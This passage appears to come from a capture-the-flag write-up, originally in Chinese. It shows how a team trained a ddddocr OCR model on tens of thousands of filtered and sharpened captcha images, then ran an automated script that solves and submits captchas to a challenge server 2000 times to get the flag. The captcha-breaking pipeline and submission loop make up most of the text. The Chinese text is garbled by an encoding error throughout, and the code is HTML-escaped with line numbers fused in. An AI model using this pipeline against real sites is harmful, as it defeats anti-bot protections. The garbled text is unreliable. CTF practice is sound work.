å†…å®¹+å¾®ç§’æ—¶é—´æˆ³ï¼‰ $timestamp = str_replace(&#x27;.&#x27;, &#x27;_&#x27;, microtime(true)); $filename = &quot;&#123;$code&#125;_&#123;$timestamp&#125;.png&quot;; $filePath = $savePath . &#x27;/&#x27; . $filename; // ä¿å­˜å›¾åƒ imagepng($image, $filePath); imagedestroy($image);&#125;echo &quot;å·²ç”Ÿæˆ100å¼ éªŒè¯ç åˆ°ç›®å½•ï¼š&#123;$savePath&#125;&quot;;?&gt; è¿™é‡Œç”¨æ—¶é—´æˆ³ä¸å¯¹ï¼Œè®­ç»ƒä¸å‡ºæ¥ï¼Œåæ¥åˆç”¨pythonè„šæœ¬æŠŠæ ‡æ³¨å¥½çš„åé¢çš„æ—¶é—´æˆ³å…¨éƒ¨æ¢æˆddddocrè¦æ±‚çš„32ä½éšæœºhexå€¼ æ‰¹é‡é‡å‘½åæˆè§„èŒƒæ ¼å¼1234567891011121314151617181920212223242526272829303132333435363738394041424344import osimport shutilimport secretsdef rename_and_copy_images(): # å®šä¹‰æºç›®å½•å’Œç›®æ ‡ç›®å½• source_dir = r&#x27;D:\\phpstudy_pro\\WWW\\IMAGE\\captcha_sharped&#x27; dest_dir = r&#x27;D:\\phpstudy_pro\\WWW\\IMAGE ewcaptcha&#x27; # æ”¯æŒçš„å›¾ç‰‡æ‰©å±•ååˆ—è¡¨ image_extensions = (&#x27;.png&#x27;, &#x27;.jpg&#x27;, &#x27;.jpeg&#x27;, &#x27;.gif&#x27;, &#x27;.bmp&#x27;) # åˆ›å»ºç›®æ ‡ç›®å½•ï¼ˆå¦‚æœä¸å­˜åœ¨ï¼‰ os.makedirs(dest_dir, exist_ok=True) # éå†æºç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶ for filename in os.listdir(source_dir): # æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ if filename.lower().endswith(image_extensions): # åˆ†ç¦»æ–‡ä»¶åå’Œæ‰©å±•å name_part, ext = os.path.splitext(filename) # è·³è¿‡ä¸è¶³5ä¸ªå­—ç¬¦çš„æ–‡ä»¶å if len(name_part) &lt; 5: print(f&quot;è­¦å‘Šï¼šè·³è¿‡æ–‡ä»¶ &#x27;&#123;filename&#125;&#x27;ï¼Œæ–‡ä»¶åé•¿åº¦ä¸è¶³5ä¸ªå­—ç¬¦&quot;) continue # æ„å»ºæ–°æ–‡ä»¶å prefix = name_part[:5] random_hex = secrets.token_hex(16) # ç”Ÿæˆ32ä½éšæœºhex new_filename = f&quot;&#123;prefix&#125;&#123;random_hex&#125;&#123;ext&#125;&quot; # æ„å»ºå®Œæ•´æ–‡ä»¶è·¯å¾„ src_path = os.path.join(source_dir, filename) dst_path = os.path.join(dest_dir, new_filename) # å¤åˆ¶æ–‡ä»¶åˆ°ç›®æ ‡ç›®å½• shutil.copy2(src_path, dst_path) print(f&quot;å·²å¤„ç†ï¼š&#123;filename&#125; -&gt; &#123;new_filename&#125;&quot;)if __name__ == &quot;__main__&quot;: rename_and_copy_images() print(&quot;æ‰€æœ‰å›¾ç‰‡å¤„ç†å®Œæˆï¼&quot;) æ¥ç€å°±æ˜¯ä¸¤ä¸ªæ‰¹é‡æ»¤æ³¢ï¼ˆæŠŠåŸæ¥çš„å•å¼ å›¾ç‰‡æ»¤æ³¢ä»£ç ä¸¢è¿›AIï¼Œç»™å‡ºåŸå§‹å›¾ç‰‡è·¯å¾„å’Œç›®æ ‡æ–‡ä»¶å¤¹ï¼Œè®©AIç”Ÿæˆï¼Œå¦‚æœæœ‰æŠ¥é”™å°±æŠŠé”™è¯¯ä¿¡æ¯æŠ•å–‚ç»™AIï¼Œæ ¹æ®AIç”Ÿæˆçš„è§£å†³æ–¹æ¡ˆé€æ­¥æ’æŸ¥ï¼‰ å»é™¤æ··æ·†è“è‰²çº¿æ¡123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from PIL import Imageimport numpy as npimport colorsysimport osimport globdef rgb_to_hsv(rgb): return colorsys.rgb_to_hsv(rgb[0]/255.0, rgb[1]/255.0, rgb[2]/255.0)def remove_specific_rgba(img, target_rgba): &quot;&quot;&quot;åˆ é™¤ç‰¹å®šRGBAé¢œè‰²çš„åƒç´ ï¼ˆè®¾ç½®ä¸ºé€æ˜ï¼‰&quot;&quot;&quot; img = img.convert(&quot;RGBA&quot;) data = np.array(img) r, g, b, a = data[:,:,0], data[:,:,1], data[:,:,2], data[:,:,3] mask = (r == target_rgba[0]) &amp; (g == target_rgba[1]) &amp; (b == target_rgba[2]) &amp; (a == target_rgba[3]) data[mask] = [0, 0, 0, 0] return Image.fromarray(data)# å‚æ•°è®¾ç½®target_blue = (64, 56, 247)hue_range = (0.58, 0.72)sat_threshold = 0.3val_threshold = 0.5remove_color = (254, 224, 222, 255)# è·¯å¾„è®¾ç½®input_dir = r&#x27;D:\\phpstudy_pro\\WWW\\IMAGE\\captcha&#x27;output_dir = r&#x27;D:\\phpstudy_pro\\WWW\\IMAGE\\captcha_filtered&#x27;# åˆ›å»ºè¾“å‡ºç›®å½•os.makedirs(output_dir, exist_ok=True)# å¤„ç†æ‰€æœ‰å›¾ç‰‡for img_path in glob.glob(os.path.join(input_dir, &#x27;*&#x27;)): try: # è¯»å–å›¾ç‰‡ img = Image.open(img_path).convert(&quot;RGB&quot;) pixels = np.array(img) # é¢œè‰²è¿‡æ»¤ hsv_pixels = np.array([[[colorsys.rgb_to_hsv(p[0]/255., p[1]/255., p[2]/255.)] for p in row] for row in pixels]) hsv_pixels = np.squeeze(hsv_pixels) h_mask = (hsv_pixels[:,:,0] &gt;= hue_range[0]) &amp; (hsv_pixels[:,:,0] &lt;= hue_range[1]) s_mask = hsv_pixels[:,:,1] &gt;= sat_threshold v_mask = hsv_pixels[:,:,2] &gt;= val_threshold combined_mask = h_mask &amp; s_mask &amp; v_mask pixels[combined_mask] = [255, 255, 255] color_img = Image.fromarray(pixels) # RGBAåˆ é™¤ color_img = remove_specific_rgba(color_img, remove_color) # è½¬æ¢ä¸ºç°åº¦ gray_img = color_img.convert(&#x27;L&#x27;) # ä¿å­˜ç»“æœ output_path = os.path.join(output_dir, os.path.basename(img_path)) gray_img.save(output_path) print(f&quot;å¤„ç†å®Œæˆ: &#123;os.path.basename(img_path)&#125;&quot;) except Exception as e: print(f&quot;å¤„ç†å¤±è´¥: &#123;os.path.basename(img_path)&#125; - &#123;str(e)&#125;&quot;) é”åŒ–å¤„ç†123456789101112131415161718192021222324252627282930313233343536373839404142434445from PIL import Imageimport numpy as npimport osimport glob# è·¯å¾„é…ç½®input_dir = r&#x27;D:\\phpstudy_pro\\WWW\\IMAGE\\captcha_filtered&#x27;output_dir = r&#x27;D:\\phpstudy_pro\\WWW\\IMAGE\\captcha_sharped&#x27;# é”åŒ–å·ç§¯æ ¸ï¼ˆæ‹‰æ™®æ‹‰æ–¯å¢å¼ºï¼‰sharpen_kernel = np.array([ [ 0, -1, 0], [-1, 5, -1], [ 0, -1, 0]], dtype=np.float32)def sharpen_image(img_array): &quot;&quot;&quot;æ‰§è¡Œå·ç§¯é”åŒ–æ“ä½œï¼Œå¿½ç•¥è¾¹ç¼˜åƒç´ &quot;&quot;&quot; filtered = np.zeros_like(img_array) for i in range(1, img_array.shape[0]-1): for j in range(1, img_array.shape[1]-1): filtered[i, j] = np.sum(img_array[i-1:i+2, j-1:j+2] * sharpen_kernel) return np.clip(filtered, 0, 255).astype(np.uint8)# åˆ›å»ºè¾“å‡ºç›®å½•os.makedirs(output_dir, exist_ok=True)# æ‰¹é‡å¤„ç†for img_path in glob.glob(os.path.join(input_dir, &#x27;*&#x27;)): try: # è¯»å–æ–‡ä»¶ img = Image.open(img_path).convert(&#x27;L&#x27;) # æ‰§è¡Œé”åŒ– sharpened_array = sharpen_image(np.array(img, dtype=np.float32)) # ä¿å­˜ç»“æœ output_path = os.path.join(output_dir, os.path.basename(img_path)) Image.fromarray(sharpened_array).save(output_path) print(f&quot;é”åŒ–æˆåŠŸ: &#123;os.path.basename(img_path)&#125;&quot;) except Exception as e: print(f&quot;å¤„ç†å¤±è´¥: &#123;os.path.basename(img_path)&#125; - &#123;str(e)&#125;&quot;) æœ€åæ‹¿åˆ°3ä¸‡å¤šå¼ æ ‡æ³¨å¥½çš„éªŒè¯ç  æ‹¿å»è®­ç»ƒåœ¨ddddocr_trainç›®å½•ä¸‹æ–°å»ºè™šæ‹Ÿç¯å¢ƒï¼Œç„¶å è®­ç»ƒ123python app.py create testpython app.py cache test D:\\phpstudy_pro\\WWW\\IMAGE ewcaptchapython app.py train test è®©æ˜¾å¡å»è®­ç»ƒå³å¯è¿™ä¸ªè®­ç»ƒç¨‹åºé»˜è®¤97%å‡†ç¡®ç‡ä¼šåœæ­¢å¹¶å¯¼å‡ºonnxæ¨¡å‹ï¼Œç„¶åæŠŠåŸæ¥çš„è¯†åˆ«è„šæœ¬åŠ ä¸Šå¯¼å…¥è¿™ä¸ªonnxæ¨¡å‹å³å¯ æ¯1000stepä¼šè¿›è¡Œaccæ£€æµ‹ï¼Œå¦‚å›¾ï¼Œç¬¬ä¸€æ¬¡æ˜¯0åˆšå¼€å§‹è®­ç»ƒæ¯”è¾ƒæ…¢ï¼Œåé¢ä¼šå˜å¿« åœ¨ç¬¬7000stepç¬¬ä¸€æ¬¡å‡ºç°accä¸ä¸º0ï¼Œè€å¿ƒç­‰å¾…å³å¯ . ç”¨4060ç®—çš„ï¼Œè·Ÿå¤§æ¨¡å‹æ¯”èµ·æ¥ï¼Œè¿™ä¸ªæ˜¾å­˜å ç”¨ç‡éå¸¸ä½ç¬¬8000stepç›´æ¥0.71875 10000stepåˆ°äº†0.9375ç¬¬14000é¦–æ¬¡åˆ°äº†1.0ï¼Œä¹‹ååœ¨0.96åˆ°1.0ä¹‹é—´æµ®åŠ¨ è®©AIåˆ†æä¸€ä¸‹æ—¥å¿— çœ‹AIè§£è¯»çš„æ§åˆ¶å°è¿™äº›æ•°æ®éƒ½æ˜¯ä»€ä¹ˆæ„æ€å°±è¡Œäº†ï¼Œä¸‹é¢è¿˜ç»™äº†ä¼˜åŒ–çš„ä»£ç ï¼Œæˆ‘ä¸æƒ³æ”¹ä»£ç è®­ç»ƒåˆ°å¤§çº¦23000stepï¼Œå¾—åˆ°æ­£ç¡®ç‡è¶…è¿‡97%çš„æ¨¡å‹ è®­ç»ƒæ•°æ®åœ¨ F:\\ctf\\ocr proj\\dddd-train\\dddd_trainer\\projects\\test\\modelsæ‰¾åˆ°onnxæ¨¡å‹å’Œcharsets.jsonå…ˆæµ‹è¯•ä¸€ä¸‹å•å¼ å›¾ç‰‡çš„è¯†åˆ«æƒ…å†µ æµ‹è¯•æ­¤onnxæ¨¡å‹èƒ½å¦æ­£å¸¸ä½¿ç”¨1234567891011121314151617181920import ddddocrimport numpy as np # æ·»åŠ è¿™è¡Œå¯¼å…¥è¯­å¥ocr = ddddocr.DdddOcr(det=False, ocr=False, import_onnx_path=r&quot;F:\\ctf\\ocr proj\\dddd-train\\dddd_trainer\\projects\\test\\models\\test_1.0_21_23000_2025-03-27-11-22-33.onnx&quot;, charsets_path=r&quot;F:\\ctf\\ocr proj\\dddd-train\\dddd_trainer\\projects\\test\\models\\charsets.json&quot;)# è®¾ç½®å­—ç¬¦èŒƒå›´ä¸ºå¤§å°å†™è‹±æ–‡+æ•°å­—ï¼ˆå¯¹åº”å‚æ•°6ï¼‰ocr.set_ranges(6)# è¯»å–å›¾ç‰‡ï¼ˆæ³¨æ„Windowsè·¯å¾„éœ€è¦è½¬ä¹‰ï¼‰image_path = r&quot;F:\\ctf\\ocr proj\\ddddocr-full\\sharpened_image.png&quot;with open(image_path, &quot;rb&quot;) as f: img_bytes = f.read()# è¿›è¡Œè¯†åˆ«å¹¶è·å–æ¦‚ç‡ç»“æœresult = ocr.classification(img_bytes, probability=True)# æ‹¼æ¥è¯†åˆ«ç»“æœs = &quot;&quot;.join([result[&#x27;charsets&#x27;][np.argmax(char_probs)] for char_probs in result[&#x27;probability&#x27;]])print(&quot;&quot;, s) é‡åˆ°äº†ç‚¹é—®é¢˜ è®©AIæ”¹ä¸€ä¸‹ä»£ç  æ‹¿åˆ°ä¿®æ”¹åçš„ä»£ç  è¯†åˆ«123456789101112131415161718192021222324252627import ddddocrimport numpy as npocr = ddddocr.DdddOcr( det=False, ocr=False, import_onnx_path=r&quot;F:\\ctf\\ocr proj\\dddd-train\\dddd_trainer\\projects\\test\\models\\test_1.0_21_23000_2025-03-27-11-22-33.onnx&quot;, charsets_path=r&quot;F:\\ctf\\ocr proj\\dddd-train\\dddd_trainer\\projects\\test\\models\\charsets.json&quot;)ocr.set_ranges(6)image_path = r&quot;F:\\ctf\\ocr proj\\ddddocr-full\\sharpened_image.png&quot;with open(image_path, &quot;rb&quot;) as f: img_bytes = f.read()# ç›´æ¥è·å–è¯†åˆ«ç»“æœï¼ˆæ¨èï¼‰result = ocr.classification(img_bytes)print(&quot;è¯†åˆ«ç»“æœ:&quot;, result)# è‹¥ç¡®å®éœ€è¦å¤„ç†æ¦‚ç‡è¾“å‡ºï¼ˆéœ€è¦ç¡®è®¤æ•°æ®ç»“æ„ï¼‰# å…ˆæ£€æŸ¥æ•°æ®ç»“æ„result_with_probs = ocr.classification(img_bytes, probability=True)print(&quot;æ•°æ®ç»“æ„:&quot;, type(result_with_probs))print(&quot;åŒ…å«çš„é”®:&quot;, result_with_probs.keys())print(&quot;probabilityç±»å‹:&quot;, type(result_with_probs[&#x27;probability&#x27;]))print(&quot;charsetsç±»å‹:&quot;, type(result_with_probs[&#x27;charsets&#x27;])) è¯†åˆ«æˆåŠŸè®©AIæŠŠå‰é¢çš„ä¸¤ä¸ªæ»¤æ³¢+ocr+éªŒè¯è„šæœ¬åˆåœ¨ä¸€èµ· æ”»å‡»123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108import requestsimport ddddocrimport numpy as npfrom PIL import Imageimport colorsysfrom io import BytesIOimport os # æ·»åŠ è·¯å¾„éªŒè¯def process_image(img_content): def rgb_to_hsv(rgb): return colorsys.rgb_to_hsv(rgb[0]/255.0, rgb[1]/255.0, rgb[2]/255.0) def remove_specific_rgba(img, target_rgba): img = img.convert(&quot;RGBA&quot;) data = np.array(img) r, g, b, a = data[:,:,0], data[:,:,1], data[:,:,2], data[:,:,3] mask = (r == target_rgba[0]) &amp; (g == target_rgba[1]) &amp; (b == target_rgba[2]) &amp; (a == target_rgba[3]) data[mask] = [0, 0, 0, 0] return Image.fromarray(data) # å‚æ•°è®¾ç½® target_blue = (64, 56, 247) hue_range = (0.58, 0.72) sat_threshold = 0.3 val_threshold = 0.5 remove_color = (254, 224, 222, 255) # ä»å­—èŠ‚æµè¯»å–å›¾ç‰‡ img = Image.open(BytesIO(img_content)).convert(&quot;RGB&quot;) pixels = np.array(img) # HSVè¿‡æ»¤ hsv_pixels = np.array([[[colorsys.rgb_to_hsv(p[0]/255., p[1]/255., p[2]/255.)] for p in row] for row in pixels]).squeeze() combined_mask = (hsv_pixels[:,:,0] &gt;= hue_range[0]) &amp; (hsv_pixels[:,:,0] &lt;= hue_range[1]) &amp; \\ (hsv_pixels[:,:,1] &gt;= sat_threshold) &amp; (hsv_pixels[:,:,2] &gt;= val_threshold) pixels[combined_mask] = [255, 255, 255] color_img = remove_specific_rgba(Image.fromarray(pixels), remove_color) # è½¬æ¢ä¸ºç°åº¦ gray_img = color_img.convert(&#x27;L&#x27;) # ç¬¬äºŒé˜¶æ®µï¼šé”åŒ–å¤„ç† sharpen_kernel = np.array([[0, -1, 0], [-1, 5, -1], [0, -1, 0]], dtype=np.float32) img_array = np.array(gray_img, dtype=np.float32) filtered = np.zeros_like(img_array) for i in range(1, img_array.shape[0]-1): for j in range(1, img_array.shape[1]-1): filtered[i, j] = np.sum(img_array[i-1:i+2, j-1:j+2] * sharpen_kernel) sharpened = np.clip(filtered, 0, 255).astype(np.uint8) # ç¬¬ä¸‰é˜¶æ®µï¼šOCRè¯†åˆ«ï¼ˆå…³é”®ä¿®æ”¹éƒ¨åˆ†ï¼‰ try: # è·¯å¾„éªŒè¯ï¼ˆè°ƒè¯•ç”¨ï¼‰ print(&quot;æ¨¡å‹å­˜åœ¨:&quot;, os.path.exists(r&quot;F:\\ctf\\ocr proj\\dddd-train\\dddd_trainer\\projects\\test\\models\\test_1.0_21_23000_2025-03-27-11-22-33.onnx&quot;)) print(&quot;å­—ç¬¦é›†å­˜åœ¨:&quot;, os.path.exists(r&quot;F:\\ctf\\ocr proj\\dddd-train\\dddd_trainer\\projects\\test\\models\\charsets.json&quot;)) # åˆå§‹åŒ–OCRå¼•æ“ ocr = ddddocr.DdddOcr( det=False, ocr=False, import_onnx_path=r&quot;F:\\ctf\\ocr proj\\dddd-train\\dddd_trainer\\projects\\test\\models\\test_1.0_21_23000_2025-03-27-11-22-33.onnx&quot;, charsets_path=r&quot;F:\\ctf\\ocr proj\\dddd-train\\dddd_trainer\\projects\\test\\models\\charsets.json&quot; ) ocr.set_ranges(6) # è®¾ç½®å­—ç¬¦èŒƒå›´ img_buffer = BytesIO() Image.fromarray(sharpened).save(img_buffer, format=&#x27;PNG&#x27;) img_bytes = img_buffer.getvalue() # ç›´æ¥è·å–è¯†åˆ«ç»“æœ result_text = ocr.classification(img_bytes) return result_text.replace(&quot; &quot;, &quot;&quot;).strip() except Exception as e: print(f&quot;OCRå¼•æ“å¼‚å¸¸: &#123;str(e)&#125;&quot;) return &quot;ERROR&quot;# è‡ªåŠ¨åŒ–å¾ªç¯éƒ¨åˆ†with requests.Session() as s: base_url = &quot;http://c15f4704-4db8-4b6f-8e09-f80cd4c22d1b.ctf.szu.moe/&quot; for i in range(1, 2001): try: # è·å–éªŒè¯ç  captcha_resp = s.get(f&quot;&#123;base_url&#125;/generate_captcha.php&quot;) if captcha_resp.status_code != 200: print(f&quot;ç¬¬&#123;i&#125;æ¬¡: è·å–éªŒè¯ç å¤±è´¥&quot;) continue # å¤„ç†è¯†åˆ« captcha_text = process_image(captcha_resp.content) print(f&quot;ç¬¬&#123;i&#125;æ¬¡è¯†åˆ«ç»“æœ: &#123;captcha_text&#125;&quot;) # æäº¤éªŒè¯ post_resp = s.post( f&quot;&#123;base_url&#125;/verify.php&quot;, data=&#123;&quot;captcha_input&quot;: captcha_text&#125; ) print(f&quot;ç¬¬&#123;i&#125;æ¬¡å“åº”: &#123;post_resp.text.strip()&#125;&quot;) except Exception as e: print(f&quot;ç¬¬&#123;i&#125;æ¬¡å‘ç”Ÿå¼‚å¸¸: &#123;str(e)&#125;&quot;) continueprint(&quot;æ‰€æœ‰å¾ªç¯å®Œæˆ&quot;) ç›´æ¥æ‰“å³å¯ æ‹¿åˆ°flag"}]